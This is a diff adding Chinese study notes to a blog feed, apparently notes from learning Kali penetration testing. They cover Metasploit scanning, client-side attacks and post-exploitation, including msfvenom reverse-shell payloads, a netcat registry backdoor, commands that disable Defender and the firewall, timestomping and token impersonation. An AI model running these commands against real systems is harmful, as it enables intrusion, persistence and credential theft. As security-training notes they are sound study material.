@@ -4,6 +4,303 @@
   
     
     <entry>
+      <title>后渗透阶段-嗅探、痕迹消除</title>
+      <link href="/2020/12/05/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%97%85%E6%8E%A2%E3%80%81%E7%97%95%E8%BF%B9%E6%B6%88%E9%99%A4/"/>
+      <url>/2020/12/05/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E5%97%85%E6%8E%A2%E3%80%81%E7%97%95%E8%BF%B9%E6%B6%88%E9%99%A4/</url>
+      
+        <content type="html"><![CDATA[<h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><ul><li>load sniffer</li><li>sniffer_interfaces</li><li>sniffer_start 2</li><li>sniffer_dump 2 1.cap /</li><li>在内存中缓存区块循环存储抓包，不写硬盘</li><li>智能过滤meterpreter流量，传输全程使用SSL/TLS加密</li></ul><a id="more"></a><h4 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h4><ul><li>use auxiliary/sniffer/psnuffle</li><li>set PCAPFILE 1.cap</li></ul><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><ul><li>search -f *.ini</li><li>search -d c\\documents\ and\ settings\\administrator\desktop\ -f *.docx</li></ul><h4 id="破解弱口令密码"><a href="#破解弱口令密码" class="headerlink" title="破解弱口令密码"></a>破解弱口令密码</h4><ul><li><p>meterpreter-&gt;hashdump即可获得用户名密码，但是用下面的模块</p></li><li><p>use post/windows/gather/hashdump #system权限的meterpreter，如果是弱密码，则会直接显示密码明文</p></li></ul><h4 id="痕迹消除"><a href="#痕迹消除" class="headerlink" title="痕迹消除"></a>痕迹消除</h4><ul><li><p>文件系统访问会留下痕迹，电子取证重点关注</p></li><li><p>渗透测试和攻击者往往希望销毁文件系统访问痕迹</p></li><li><p>最好的避免被电子取证发现的方法：不要碰文件系统</p><ul><li>meterpreter的先天优势：完全基于内存</li></ul></li><li><p>MAC时间（Modified/Accessed/Changed）</p><ul><li>ls -l –time=xxxx</li><li>stat 1.txt</li><li>touch -d “2 days ago” 1.txt</li><li>touch -t 1501010101 1.txt</li></ul></li><li><p>timestomp</p><ul><li>timestomp 1.txt -t template.txt</li></ul></li><li><p>MACE：MFT entry</p><ul><li>MFT：NTFS文件系统的主文件分配表 Master File Table</li><li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li><li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建日期）</li><li>更多信息可研究 文件系统取证分析技术</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>后渗透阶段-提权、后门、域渗透</title>
+      <link href="/2020/12/02/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E6%8F%90%E6%9D%83%E3%80%81%E5%90%8E%E9%97%A8%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+      <url>/2020/12/02/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5-%E6%8F%90%E6%9D%83%E3%80%81%E5%90%8E%E9%97%A8%E3%80%81%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p>已经获得目标系统控制权后扩大战果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>永久后门</li></ul></li><li><p>基于已有session扩大战果</p><a id="more"></a><ul><li>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o 1.exe</li></ul></li></ul><hr><h4 id="关闭UAC、提权"><a href="#关闭UAC、提权" class="headerlink" title="关闭UAC、提权"></a>关闭UAC、提权</h4><ul><li>load priv</li><li>getsystem<ul><li>priv_elevate_getsystem:Operation failed:Access is denied.</li></ul></li><li>绕过UAC限制（当前session有效）<ul><li>use exploit/windows/local/ask</li><li>use exploit/windows/local/bypassuac</li><li>use exploit/windows/local/bypassuac_injection</li></ul></li><li>利用漏洞直接提权为system<ul><li>use exploit/windows/local/ms13_053_schlamperei</li><li>use exploit/windows/local/ppr_flatten_rec</li></ul></li><li>图形化界面<ul><li>set payload windows/vncinject/reverse_tcp</li><li>set viewonly no</li></ul></li><li>load priv-&gt;hashdump</li><li>psexec的pass the hash<ul><li>use exploit/windows/smb/psexec</li><li>set smbpass hash</li><li>需要提前关闭UAC（是关闭不是绕过）<ul><li>通过cmd执行注册表修改</li></ul></li></ul></li><li>关闭windows防火墙<ul><li>需要成为管理员或system权限</li><li>netsh advfirewall set allprofiles state off</li></ul></li><li>关闭windowsDefender<ul><li>net stop windefend</li><li>net stop 服务名称</li></ul></li><li>Bitlocker 磁盘加密<ul><li>manage-bde -off C:</li><li>manage-bde -status C:</li></ul></li><li>关闭DEP<ul><li>bcdedit.exe /set{current}nx AlwaysOff</li></ul></li><li>杀死防病毒软件<ul><li>killav</li><li>run post/windows/manage/killav</li></ul></li><li>开启远程桌面服务<ul><li>run /post/windows/manage/enable_rdp</li><li>run getgui -e<ul><li>run getgui -u user -p pass</li></ul></li></ul></li><li>查看远程桌面<ul><li>screenshot</li><li>use espia(load espia)-&gt;screengrab</li></ul></li></ul><hr><h4 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h4><ul><li><p>Tokens</p><ul><li>用户每次登陆，账号绑定临时的Token</li><li>访问资源时提交Token进行身份验证，类似于Web Cookie</li><li>Delegate Token：交互登录会话（本地登录和远程登录，都是活动状态）</li><li>Impersonate Token：非交互登录会话（\\192.168.0.113 访问文件共享）</li><li>Delegate Token帐号注销后变为Impersonate Token，权限依然有效</li></ul></li><li><p>Incognito</p><ul><li>独立功能的软件，被MSF集成在meterpreter中</li><li>无需密码破解或获取密码hash，窃取token将自己伪装成其他用户</li><li>尤其适用于域环境下提权渗透多操作系统</li><li>load incognito<ul><li>list_token -u</li><li>impersonate_token LAB\administrator</li><li>execute -f cmd.exe -i -t<ul><li>-t 使用当前token</li></ul></li></ul></li></ul></li></ul><hr><h4 id="通过注册表留后门"><a href="#通过注册表留后门" class="headerlink" title="通过注册表留后门"></a>通过注册表留后门</h4><ul><li><p>注册表保存着windows几乎全部配置参数</p><ul><li>如果修改不当，可直接造成系统崩溃</li><li>修改前完整备份注册表</li><li>某些注册表的修改是不可逆的</li></ul></li><li><p>常见用途</p><ul><li>修改、增加启动项</li><li>窃取存储与注册表中的机密信息</li><li>绕过文件型病毒查杀</li></ul></li><li><p>用注册表添加NC后门服务（meterpreter）</p><ul><li>upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</li><li>查看启动项：reg enumkey -k HKLM\software\microsoft\windows\currentversion\run（这个路径是四个启动项路径之一）</li><li>在其中增加一条键值：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d “C:windows\\system32\nc.exe -Ldp 444 -e cmd.exe”</li></ul></li><li><p>添加防火墙规则</p><ul><li>execute -f cmd -i -H</li><li>netsh firewall show opmode</li><li>netsh firewall add portopening TCP 4444 “test” ENABLE ALL(注意名字换隐蔽性强的)</li><li>shutdown -r -f -t 0<ul><li>需要关闭UAC，否则Access is denied.(5)</li></ul></li><li>nc 1.1.1.1 4444<ul><li>中文乱码，shell下<code>chcp 65001</code></li></ul></li></ul></li><li><p>其它注册表项，google搜索registry quick find chart</p></li></ul><h4 id><a href="#" class="headerlink" title></a></h4>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>漏洞挖掘-静态代码分析</title>
+      <link href="/2020/12/01/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+      <url>/2020/12/01/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<a id="more"></a><h3 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><ul><li>软件源代码的主要安全检测技术</li><li>不需要构建代码运行环境，分析效率高，资源消耗低</li></ul><h5 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h5><ul><li>基于文本或标识符的匹配分析对比，以查找符合特定特征和词法规则的危险函数，API或简单语句组合。</li><li>工具：Checkmarx、ITS4</li></ul><h5 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h5><ul><li>分析软件代码中变量的取值变化和语句执行情况，来分析数据处理逻辑和程序的流控制关系，从而分析软件代码的潜在安全缺陷。</li><li>适合检查因控制流信息非法传播导致的安全问题，比如内存访问越界，常数传播等。</li><li>对于逻辑复杂的软件代码，其数据流复杂，检测准确率较低，误报率较高。</li></ul><h5 id="污点传播"><a href="#污点传播" class="headerlink" title="污点传播"></a>污点传播</h5><ul><li>分析代码中输入数据对程序执行的影响，以发现不可信的输入数据导致的程序异常执行。</li><li>需要标记要分析的输入数据</li><li>具有较高的分析准确率，然而针对大规模代码分析，由于路径数量较多，因此其分析的性能会受到较大的影响。</li><li>工具：Pixy</li></ul><h5 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h5><ul><li>在不执行程序的前提下，将程序的输入表示为符号，根据程序的执行流程和输入参数的赋值变化，把程序的输出表示成包含这些符号的逻辑或算式表达式的一种技术。通过符号执行技术获得了程序输入和输出之间关系的算数表达式，可通过约束求解的方法获得能得出正常输出结果得到输入值的范围。不能得到正常输入出的输入值，或者输入值范围的安全边界点，则是处罚程序输出异常结果的潜在输入点，也是进行安全监测的重要检测区域。</li><li>代价小、效率高。但存在路径爆炸的问题。</li></ul><h5 id="模型检验"><a href="#模型检验" class="headerlink" title="模型检验"></a>模型检验</h5><ul><li>模型检验技术首先将软件构造为状态机或者有向图等抽象模型，并使用模态、时序逻辑公式等形式化的表达来描述安全属性，然后对模型进行遍历以验证软件的这些安全属性是否满足。</li><li>可以实现全自动化，但存在状态空间爆炸的问题。</li></ul><h5 id="定理证明"><a href="#定理证明" class="headerlink" title="定理证明"></a>定理证明</h5><ul><li>是将待验证问题转化为数学上的定理证明问题，从而判断程序是否满足特定安全属性。</li><li>准确率最高，误报率较低。需要人工干预，自动化程度不高。难以用于新漏洞检测和大型程序分析。</li><li>工具：Saturn、ESC/Java</li></ul><h4 id="可执行代码检测"><a href="#可执行代码检测" class="headerlink" title="可执行代码检测"></a>可执行代码检测</h4><ul><li>对可执行代码进行反汇编后检测</li><li>分析效率低下，误报率高</li><li>分为基于程序结构的安全检测和基于程序语义的安全检测技术</li></ul><h5 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h5><ul><li>从二进制文件的头部，符号表以及调试信息中提取安全敏感信息</li><li>IDA Pro、Bugscam</li></ul><h5 id="程序语义"><a href="#程序语义" class="headerlink" title="程序语义"></a>程序语义</h5><ul><li>首先反汇编得到汇编代码，再将汇编代码转换为中间语言，在分析中间语言的基础上针对得到的部分语义信息进行缺陷和漏洞检测。</li><li>目前使用最为广泛的两种中间语言是二进制插桩平台Binnavi中使用的REIL，和动态插桩平台Valgrind中使用的VEX</li><li>跨平台</li><li>逆向分析的三个步骤<ul><li>（先逆向，比如用IDA）找到操作栈的关键函数，比如memcpy、strcpy等</li><li>判断栈与操作参数的大小关系，以定位是否发生了溢出漏洞</li><li>回溯函数的参数</li></ul></li></ul><h5 id="程序语义-1"><a href="#程序语义-1" class="headerlink" title="程序语义"></a>程序语义</h5><h4 id="动态安全检测"><a href="#动态安全检测" class="headerlink" title="动态安全检测"></a>动态安全检测</h4>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ShellCode编写</title>
+      <link href="/2020/11/30/ShellCode%E7%BC%96%E5%86%99/"/>
+      <url>/2020/11/30/ShellCode%E7%BC%96%E5%86%99/</url>
+      
+        <content type="html"><![CDATA[<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ol><li>特殊字符需要转码。<ul><li>比如strcpy等函数造成的缓冲区溢出，会认为NULL是字符串的终结，所以shellcode中不能有null，如果有则需要变通或编码。</li></ul></li><li>函数API定位很困难。<ul><li>比如在windows系统下，系统调用多数都是封装在高级API中来调用的，而且不同的ServicePack或版本的操作系统其API都可能有所改动，所以不可能直接调用，因此需要采用动态的方法获取API地址。</li></ul></li></ol><a id="more"></a><h4 id="简单的编写shellcode的方法步骤"><a href="#简单的编写shellcode的方法步骤" class="headerlink" title="简单的编写shellcode的方法步骤"></a>简单的编写shellcode的方法步骤</h4><ol><li>用C语言书写要执行的shellcode，利用调试功能，找到其对应的汇编代码</li><li>对汇编语言进行再加工，对于push 0而言，可以通过xor ebx ebx 之后在push ebx 来实现。</li><li>在汇编第一行代码打断点，利用调试定位具体内存中的地址，找到对应地址中的机器码。</li><li>编写测试程序进行测试。</li></ol><h4 id="Windows中的防范措施"><a href="#Windows中的防范措施" class="headerlink" title="Windows中的防范措施"></a>Windows中的防范措施</h4><ul><li><p>ASLR（address space layout randomization）</p><ul><li>目的：打乱系统中的固定地址</li><li>包括：PE文件，映像地址，堆栈基址、堆地址、PEB和TEB（Thread Environment Block，线程环境块）地址。</li><li>当程序启动，将执行文件加载到内存时，操作系统通过内核模块提供的ASLR功能，在原来映像基址的基础上加上一个随机数作为新的映像基址。随机数的取值范围限定为1至254，并保证每个数值随机出现。</li></ul></li><li><p>GS Stack Protection</p><ul><li>在使用VC7.0、VS2005及后续版本编译时支持该选项。</li><li>在函数被调用时，在缓冲区和函数返回地址间增加一个32位的随机数security_cooie，在函数返回时，调用检查函数security_cookie的值是否有变化。</li><li>security_cookie在进程启动时随机产生，并且它的原始存储地址因Windows操作系统的ASLR机制也是随机存放的，攻击者无法对security_cookie进行篡改。</li></ul></li><li><p>DEP</p><ul><li>数据执行保护DEP（data execute prevention）技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。</li><li>Windows操作系统中，默认情况下将包含执行代码和DLL文件的txt段，即代码段得到内存区域设置为可执行代码的内存区域，其它的内存区域不包含执行代码，不具有代码执行权限。</li><li>WindowsXP及之前的操作系统没有对这些内存区域的代码执行进行限制。</li><li>DEP分为软件DEP和硬件DEP。硬件DEP需要CPU支持，需要CPU在页表增加一个保护位NX（no execute），来控制页面是否可执行。现在的CPU一般都支持，现在的DEP一般都是硬件DEP。</li></ul></li><li><p>SafeSEH</p><ul><li>SEH(structured exception handler)是Windows异常处理机制所采用的重要数据结构链表。程序设计者可以根据自身需要，定义程序发生各种异常时相应的处理函数，保存在SEH中。</li><li>通过精心构造，攻击者通过缓冲区溢出覆盖SEH中异常处理函数句柄，将其替换为指向恶意代码的地址，并触发相应的异常，从而使程序流程转向执行恶意代码。</li><li>SafeSEH是保护Seh函数不被非法利用的技术。微软在编译器中加入了SafeSEH选项，采用该选项编译的程序将PE文件中所有合法的SEH异常处理函数的地址解析出来制成一张SEH函数表，放在PE文件的数据块中，用于异常处理时进行匹配检查。</li><li>函数表是加密的，读取时解密。</li></ul></li><li><p>SEHOP(Structed Exception Handler Overwrite Protection)</p><ul><li>检测：<ul><li>SEH结构都必须在栈上，最后一个SEH结构也必须在栈上</li><li>所有的SEH结构必须是4字节对齐的</li><li>SEH结构中异常处理函数的句柄handle（即处理函数地址）必须不在栈上</li><li>最后一个SEH结构的handle必须是（ntdll!FinalExceptionHandler）函数等</li></ul></li></ul></li></ul><h4 id="漏洞利用技术"><a href="#漏洞利用技术" class="headerlink" title="漏洞利用技术"></a>漏洞利用技术</h4><h5 id="esp跳板"><a href="#esp跳板" class="headerlink" title="esp跳板"></a>esp跳板</h5><ul><li><p>问题：</p><ul><li>有些软件的漏洞存在于某些动态链接库中，进程运行时动态加载。此外，在使用类似ASLR技术的操作系统中，地址也会因为引入的随机数每次发生变化。</li><li>此时，需要让覆盖返回地址后 新写入的返回地址能够自动定位到shellcode起始地址。</li></ul></li><li><p>解决：</p><ul><li>利用esp寄存器的特性实现，使用jmp esp作为跳板。</li><li>在函数调用结束后，被调用函数的栈帧被释放，esp寄存器中断栈顶指针指向返回地址在内存高地址方向的相邻位置。可见，通过esp寄存器，可以准确定位返回地址所在的位置。</li><li>在内存中找到一个jmp esp（跳转到esp寄存器保存的地址），将这条指令的地址覆盖返回地址。</li><li>在返回地址相邻的高地址写入shellcode代码。</li><li>move eax,exp 和 jmp eax等指令序列也可以实现。</li></ul></li></ul><h5 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h5><ul><li><p>有些漏洞，不支持或者不能实现精确定位shellcode。且堆分配地址随机性比较大。</p></li><li><p>对喷洒是在shellcode前面加上大量的滑板指令（slide code），组成一个非常长的注入代码段。然后向系统申请大量内存，并且反复用这个注入代码段来填充。这样就使得内存空间被大量的注入代码所占据。攻击者再结合漏洞利用技术，只要使程序跳转到堆中被填充了注入代码的任何一个地址，程序指令就会顺着滑板指令最终执行到shellcode代码。</p></li><li><p>滑板指令一般是NOP(no-operation)0x90</p></li><li><p>随着一些新的攻击技术出现，滑板指令除了利用NOP指令填充外，也逐渐开始使用更多的类NOP指令，譬如0x0C，0x0D(回车、换行)等。</p></li><li><p>对喷洒用于针对浏览器漏洞的攻击较多，尤其是网页木马应用较多，这些漏洞利用程序通常会将EIP指向堆区的0x0C0C0C0C地址，然后使用Javascript脚本申请大量堆内存，在内存空间中填充大量包含0x和shellcode的注入代码。漏洞利用程序从低地址向高地址一直申请超过200MB的堆内存空间，由于200M对应的内存地址为0x0C800000,高于EIP指向的0x0C0C0C0C,因而申请的堆空间超过200MB时将覆盖0x0C0C0C0C,只要注入代码中的0x90能覆盖0x0C0C0C0C，就可以成功。</p></li><li><p>占用内存大，容易被察觉。</p></li><li><p>一般配合堆栈溢出攻击，不能用于主动攻击，也不能保证成功。</p></li><li><p>对于windows系统比较好的系统防范方法是开启DEP功能，即使被绕过，被利用的概率也会大大降低。</p></li></ul><h5 id="DEP绕过"><a href="#DEP绕过" class="headerlink" title="DEP绕过"></a>DEP绕过</h5><ul><li><p>基本思想：</p><ul><li>ROP（return-oriented programing）攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。ROP允许我们绕过DEP和ALSR，但不能绕开GS缓冲区溢出的检测防护技术。</li><li>借助已经存在的代码块（也叫配件），这些配件来自程序已经加载的模块。我们可以在已经加载的模块中找到一些以retn结尾的配件，把这些配件的地址布置在堆栈上，当控制EIP并返回的时候，程序就会跳去执行这些配件，而这些配件是在别的模块代码段，不受DEP影响。</li><li>retn的操作是 pop eip，然后执行eip指向的指令。</li></ul></li><li><ol><li>ROP通过ROP链（retn）实现有序的汇编指令执行</li><li>ROP链由一个个ROP小配件组成</li><li>ROP小配件由目的执行指令+return组成</li></ol></li><li><p>未启用ASLR的小配件有很多</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF-扫描器和客户端渗透</title>
+      <link href="/2020/11/29/MSF-%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/"/>
+      <url>/2020/11/29/MSF-%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<h4 id="扫描器扫描"><a href="#扫描器扫描" class="headerlink" title="扫描器扫描"></a>扫描器扫描</h4><h5 id="Openvas（GVM）"><a href="#Openvas（GVM）" class="headerlink" title="Openvas（GVM）"></a>Openvas（GVM）</h5><ul><li><p>Load openvas</p><ul><li>命令行模式，需要配置，使用繁琐</li></ul></li><li><p>直接在opevas扫描，向msf导入nbe格式扫描日志</p><ul><li>db_import openvas.nbe</li></ul></li></ul><a id="more"></a><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><ul><li>也是nbe格式</li><li><h2 id="直接调用nessus"><a href="#直接调用nessus" class="headerlink" title="直接调用nessus"></a>直接调用nessus</h2></li></ul><h5 id="Nextpose"><a href="#Nextpose" class="headerlink" title="Nextpose"></a>Nextpose</h5><ul><li>xml格式</li></ul><h4 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h4><ul><li>在无法突破网路边界的情况下转而攻击客户端<ul><li>社会工程学攻击</li><li>进而渗透线上业务网络</li></ul></li><li>含有漏洞利用代码的WEB站点<ul><li>利用客户端漏洞</li></ul></li><li>含有漏洞利用代码的DOC、PDF等文档</li><li>诱骗被害者执行Payload</li></ul><hr><h5 id="打包payload进deb安装包"><a href="#打包payload进deb安装包" class="headerlink" title="打包payload进deb安装包"></a>打包payload进deb安装包</h5><ul><li>先用msfvenom生成pyaload</li><li>use exploit/multi/handler</li><li>set payload windows/shell/reverse_tcp</li><li>set LHOST xxx;set LPORT xxx;</li><li>exploit(侦听端口)</li><li>想办法让payload执行</li><li>Linux下可以把payload打包进deb，然后诱使目标执行。</li></ul><hr><h5 id="其它方式"><a href="#其它方式" class="headerlink" title="其它方式"></a>其它方式</h5><ul><li>利用Acrobat Reader漏洞执行payload</li><li>构造PDF文件：exploit/widows/fileformat/adobe_utilprintf</li><li>构造恶意网站：exploit/windows/browser/adobe_utilprintf</li><li>IE浏览器漏洞：search ms14_064</li><li>JRE漏洞：search java_jre</li><li>flash漏洞：exploit/multi/browser/adobe_flash_hacking_team_uaf</li><li>生成Android后门程序<ul><li>use payload/android/meterpreter/reverse_tcp</li><li>generate -f a.apk -p android -t raw</li></ul></li><li>VBScript感染方式<ul><li>利用宏感染word、excel</li><li>绕过某些基于文件类型检查的安全机制</li><li>生成vbscript脚本：<ul><li>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.43.125 LPORT=4444 -e x86/shikata_ga_nai -f vba.exe</li><li>在word把payload第一部分VBA代码保存成宏，随便起个名字</li><li>payload第二部分粘贴入word文档正文</li></ul></li></ul></li><li>Meterpreter<ul><li>use priv</li><li>run post/windows/capture/keylog_recorder</li></ul></li><li>search browser_autopwn</li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>apt-get install 下载目录/var/cache/apt/archives</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF-弱点扫描</title>
+      <link href="/2020/11/28/MSF-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/"/>
+      <url>/2020/11/28/MSF-%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/</url>
+      
+        <content type="html"><![CDATA[<h4 id="MSF-弱点扫描"><a href="#MSF-弱点扫描" class="headerlink" title="MSF-弱点扫描"></a>MSF-弱点扫描</h4><ul><li>根据信息收集结果搜索漏洞利用模块</li><li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li></ul><hr><ul><li><p>VNC密码破解</p><ul><li>5900端口</li><li>use auxiliary/scanner/vnc/vnc_login</li></ul></li><li><p>VNC无密码访问</p><ul><li><p>use auxiliary/scanner/vnc/vnc_none_auth</p><a id="more"></a><ul><li>如果是无密码的，则显示supported:None,free access!</li></ul></li></ul></li><li><p>RDP远程桌面漏洞</p><ul><li>use auxiliary/sacnner/rdp/ms12_020_check</li><li>检查不会造成DoS攻击</li><li>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<ul><li>蓝屏重启</li></ul></li></ul></li><li><p>设备后门</p><ul><li>use auxiliary/scanner/ssh/juniper</li><li>use auxiliary/scanner/ssh/fortinet_backdoor</li></ul></li><li><p>VMWare ESXi密码爆破</p><ul><li>use auxiliary/scanner/vmware/vmauthd_login</li><li>use auxiliary/scanner/vmware/vmware_enum_vms</li></ul></li><li><p>利用WEB API远程开启虚拟机</p><ul><li>ues auxiliary/admin/vmware/pweron_vm</li></ul></li></ul><hr><h4 id="HTTP弱点扫描"><a href="#HTTP弱点扫描" class="headerlink" title="HTTP弱点扫描"></a>HTTP弱点扫描</h4><ul><li><p>过期证书</p><ul><li>use auxiliary/scanner/http/cert</li></ul></li><li><p>显示目录及文件</p><ul><li>use auxiliary/scanner/http/dir_listing</li><li>use auxiliary/scanner/http/files_dir</li></ul></li><li><p>WebDAV Unicode 编码身份验证绕过</p><ul><li>use auxiliary/scanner/http/dir_webdav_unicode_bypass</li></ul></li><li><p>Tomcat 管理登陆</p><ul><li>use auxiliary/scanner/http/tomcat_mgr_login</li></ul></li><li><p>基于http方法的身份验证绕过</p><ul><li>use auxiliary/scanner/http/verb_auth_bypass</li></ul></li><li><p>wordpress密码爆破</p><ul><li>wordpress_login_enum</li></ul></li><li><p>WMAP WEB应用扫描器</p><ul><li>根据SQLMAP的工作方式开发</li><li>load wmap</li><li>wmap_sites -a <a href="http://192.168.8.133" target="_blank" rel="noopener">http://192.168.8.133</a></li><li>wmap_targets -t <a href="http://1.1.1.1/multilidae/index.php" target="_blank" rel="noopener">http://1.1.1.1/multilidae/index.php</a></li><li>wmap_run -t</li><li>wmap_run -e</li><li>wmap_vulns -l</li><li>vulns</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF-信息收集、发现和端口扫描</title>
+      <link href="/2020/11/26/MSF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
+      <url>/2020/11/26/MSF-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
+      
+        <content type="html"><![CDATA[<h4 id="MSF–信息收集"><a href="#MSF–信息收集" class="headerlink" title="MSF–信息收集"></a>MSF–信息收集</h4><ul><li><p>Nmap扫描</p><ul><li>db_nmap -sV 192.168.0.1/24</li></ul></li><li><p>Auxiliary扫描模块</p><ul><li><p>主机发现</p><ul><li>search arp</li><li>use auxiliary/scanner/discovery/arp_sweep</li><li>set INTERFACE RHOSTS SHOST SMAC THREADS </li><li>run</li></ul><a id="more"></a></li><li><p>端口扫描</p><ul><li>search portscan</li><li>use auxiliary/scanner/portscan/syn</li><li>set INTERFACE、PORTS、RHOSTS、THREADS</li><li>run</li></ul></li><li><p>idle扫描</p><ul><li>查找ipidseq主机<ul><li>use auxiliary/scanner/ip/ipidseq</li><li>set rhosts 192.168.43.1/24</li><li>run</li></ul></li><li>nmap -PN -sI 192.168.43.117</li></ul></li><li><p>UDP扫描</p><ul><li>use /auxiliary/scanner/discovery/udp_sweep</li><li>~/udp_probe</li></ul></li></ul></li></ul><hr><ul><li><p>密码嗅探</p><ul><li>psnuffle，支持从pcap抓包文件提取密码，功能类似于dnsniff</li><li>支持pop3 imap ftp httpget</li></ul></li><li><p>SNMP扫描</p><ul><li>metasploitable：vi /etc/default/snmpd<ul><li>修改侦听地址</li></ul></li><li>use auxiliary/scanner/snmp/snmp_login</li><li>use auxiliary/scanner/snmp/snmp_enum</li><li>~enumusers</li><li>~enumshares</li></ul></li><li><p>SMB版本扫描</p><ul><li>use auxiliary/scanner/smb/smb_version</li></ul></li><li><p>扫描命名管道，判断SMB服务类型（账号，密码）</p><ul><li>use auxiliary/scanner/smb/pipe_auditor</li></ul></li><li><p>扫描通过SMB管道可以访问的DCERPC服务</p><ul><li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li></ul></li><li><p>SMB共享枚举（账号、密码）</p><ul><li>use auxiliary/scanner/smb/smb_enumshares</li></ul></li><li><p>SMB用户枚举</p><ul><li>use auxiliary/scanner/smb/smb_enumusers</li></ul></li><li><p>用户sid枚举</p><ul><li>use auxiliary/scanner/smb/smb_lookupsid</li></ul></li></ul><hr><ul><li><p>SSH版本扫描</p><ul><li>use auxiliary/scanner/ssh/ssh_version</li></ul></li><li><p>SSH密码爆破</p><ul><li>use auxiliary/scanner/ssh/ssh_login<ul><li>set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</li><li>set verbose true</li><li>run</li></ul></li></ul></li><li><p>SSH公钥登陆</p><ul><li>use auxiliary/scanner/ssh/ssh_login_pubikey<ul><li>set key_file id_rsa(通过各种方式获得的key)</li><li>set username 